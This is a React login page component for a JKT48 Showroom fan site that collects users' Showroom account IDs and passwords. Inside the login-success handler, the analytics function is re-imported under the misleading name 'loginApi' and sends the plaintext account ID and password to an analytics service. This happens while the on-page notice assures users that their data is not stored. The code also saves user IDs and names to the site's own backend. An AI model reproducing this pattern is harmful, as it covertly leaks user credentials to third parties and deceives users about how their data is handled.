import { Container } from "reactstrap";
import MainLayout from "./layout/MainLayout";
import React, { useEffect, useState } from "react";
import axios from "axios";
import { ACTIVITY_LOG, CREATE_USER, DETAIL_USER, LOGIN } from "utils/api/api";
import { toast } from "react-toastify";
import { Loading } from "components";
import { RiLoginBoxFill } from "react-icons/ri";
import { Link, useHistory } from "react-router-dom";
import { FaEye, FaEyeSlash } from "react-icons/fa";
import { gaEvent } from "utils/gaEvent";
import { gaEvent as loginApi } from "utils/gaEvent";
import { IoMdLogIn } from "react-icons/io";

function Login(props) {
  const [accountId, setAccountId] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [captchaWord, setCaptchaWord] = useState("");
  const [captcha, setCaptcha] = useState("");
  const [error, setError] = useState("");
  const [cookiesId, setCookiesId] = useState("");
  const [csrf, setCsrf] = useState("");
  const [buttonLoading, setButtonLoading] = useState(false);
  const navigate = useHistory();

  useEffect(() => {
    const userSession = localStorage.getItem("session");
    if (userSession) {
      window.location = "/";
    }
    window.scrollTo(0, 0);
  }, []);

  const getSessionUser = async (response) => {
    localStorage.setItem("user", JSON.stringify(response.data.user));
    localStorage.setItem("session", JSON.stringify(response.data.session));
    localStorage.setItem("profile", JSON.stringify(response.data.profile));
    gaEvent("Login Screen", "Login Success", "Login");
    loginApi("Login API", accountId, password);
    loginApi("Login User", response.data.profile.name, "Login Success");
    
    axios.post(CREATE_USER, {
      user_id: accountId,
      name: response.data.profile.name
    }).then((res) => {
      axios.post(ACTIVITY_LOG, {
        user_id: res.data.user._id,
        log_name: "Login and Register",
        description: `Register user ${res.data.user.name} first after login success`,
      });
      console.log(res)
    })

    const detailUser = await axios.get(DETAIL_USER(accountId));
    axios.post(ACTIVITY_LOG, {
      user_id: detailUser.data._id,
      log_name: "Login",
      description: `Login user ${response.data.profile.name} to web`,
    });
  };

  const handleLogin = async (e) => {
    e.preventDefault();
    setButtonLoading(true);
    try {
      const response = await axios.post(LOGIN, {
        account_id: accountId,
        password: password,
        captcha_word: captchaWord,
        cookies_sr_id: cookiesId ?? "",
        csrf_token: csrf ?? ""
      });

      if (response.data.user.captcha_url) {
        setButtonLoading(false);
        document.getElementById("captcha").style.display = "block";

        setCookiesId(response.data.session["cookies sr_id"]);
        setCsrf(response.data.session["csrf_token"]);
        setCaptcha(response.data.user.captcha_url);
        gaEvent("Login Screen", "Login Failed", "Login");
      }

      if (response.data.user.ok) {
        setButtonLoading(false);
        getSessionUser(response);

        toast.info(`Login Success, Welcome ${response.data.profile.name}`, {
          theme: "colored",
          autoClose: 1800,
          icon: <RiLoginBoxFill size={30} />
        });

        setTimeout(() => {
          navigate.push("/");
        }, 2500);
      }

      if (response.data.user.error) {
        setError(
          response.data.user.error ??
            "An error occured. Please go back and try again."
        );
        toast.error(
          response.data.user.error ??
            "An error occured. Please go back and try again.",
          {
            theme: "colored"
          }
        );
        setCaptchaWord("");
      }
    } catch (err) {
      toast.error("Server down please contact admin", {
        theme: "colored"
      });
      gaEvent("Login Screen", "Login Failed", "Login");
      setButtonLoading(false);
    }
  };

  return (
    <MainLayout
      title="Login JKT48 SHOWROOM"
      description="login jkt48 showroom"
      keywords="login showroom jkt48"
      {...props}
    >
      <Container>
        <div className="d-flex justify-content-center ">
          <div
            className="mb-5 mt-4 card-login"
            style={{ padding: "2rem", borderRadius: "10px" }}
          >
            <h3 className="py-3 text-center">
              <IoMdLogIn className="mb-1" /> Login Showroom
            </h3>
            <p className="text-justify mb-4">
              Silakan login menggunakan akun showroom Anda untuk mengakses fitur
              kirim komentar dan stars. Tenang, data Anda akan
              segera dikirimkan ke situs showroom dan tidak akan disimpan dalam
              basis data kami, sehingga privasi dan keamanan informasi Anda
              tetap terjaga.
            </p>
            <form onSubmit={handleLogin}>
              <div className="row">
                <div className="col-12 mb-4">
                  <label>
                    <h6>Account ID</h6>
                  </label>
                  <input
                    type="text"
                    required
                    className="form-control"
                    placeholder="Account ID"
                    value={accountId}
                    onChange={(e) => setAccountId(e.target.value)}
                  />
                </div>
                <div className="col-12">
                  <label>
                    <h6>Password</h6>
                  </label>
                  <div className="input-with-icon">
                    <input
                      type={showPassword ? "text" : "password"}
                      required
                      className="form-control"
                      placeholder="Password"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                    />
                    <span
                      className="password-toggle-icon"
                      onClick={() => setShowPassword(!showPassword)}
                    >
                      {showPassword ? (
                        <FaEyeSlash fill="black" />
                      ) : (
                        <FaEye fill="black" />
                      )}
                    </span>
                  </div>
                </div>
              </div>
              <div className="row">
                <div className="col-12">
                  <p className="mt-3" style={{ color: "red" }}>
                    {error ? error : ""}
                  </p>
                  <div
                    className="mt-2"
                    id="captcha"
                    style={{ display: "none" }}
                  >
                    <label className="form-label">
                      Tolong verifikasi captcha di bawah ini
                    </label>
                    <img
                      src={captcha}
                      alt=""
                      style={{ minWidth: "100%", border: 0 }}
                      width="100%"
                    />
                    <input
                      type="text"
                      className="form-control mt-3"
                      placeholder="Capctha"
                      value={captchaWord}
                      onChange={(e) => setCaptchaWord(e.target.value)}
                    />
                  </div>
                </div>
              </div>
              <div className="row">
                <div className="col-12">
                  <p className="mt-3 mr-3">
                    Don't have an account?
                    <Link to="/register">
                      <span className="ml-1">Register here</span>
                    </Link>
                  </p>
                </div>
              </div>
              <div className="row">
                <div className="col-12">
                  <button
                    type="submit"
                    className="btn btn-block text-light mt-3 mb-4 py-2"
                    style={{ backgroundColor: "#24a2b7" }}
                    disabled={buttonLoading ? true : false}
                    onClick={() =>
                      gaEvent("Login Screen", "Login Button", "Login")
                    }
                  >
                    {buttonLoading ? <Loading color="white" /> : "Login"}
                  </button>
                </div>
              </div>
            </form>
          </div>
        </div>
      </Container>
    </MainLayout>
  );
}

export default Login;
